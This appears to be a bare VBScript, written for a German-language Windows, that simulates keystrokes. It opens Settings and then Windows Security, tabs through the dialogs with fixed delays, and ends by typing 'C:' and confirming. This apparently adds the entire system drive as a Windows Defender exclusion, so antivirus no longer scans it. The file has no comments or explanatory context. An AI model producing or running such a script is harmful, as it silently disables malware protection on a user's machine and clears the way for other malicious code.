Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.SendKeys "^{ESC}"
WScript.Sleep 500
WshShell.SendKeys "Einstellungen"
WScript.Sleep 100
WshShell.SendKeys "~"
WScript.Sleep 1000
WshShell.SendKeys "Windows-Sicherheit"
WScript.Sleep 500

For x = 1 To 2
    WScript.Sleep 500
    WshShell.SendKeys "{DOWN}"
Next
For x = 1 To 2
    WScript.Sleep 500
    WshShell.SendKeys "~"
Next
For x = 1 To 4
    WScript.Sleep 500
    WshShell.SendKeys "{TAB}"
Next
WshShell.SendKeys "~"
For x = 1 To 7
    WScript.Sleep 500
    WshShell.SendKeys "{TAB}"
Next
WshShell.SendKeys "~"
WshShell.SendKeys "~"
WshShell.SendKeys "{DOWN}"
WshShell.SendKeys "~"
WshShell.SendKeys "C:"
WshShell.SendKeys "~"
WshShell.SendKeys "~"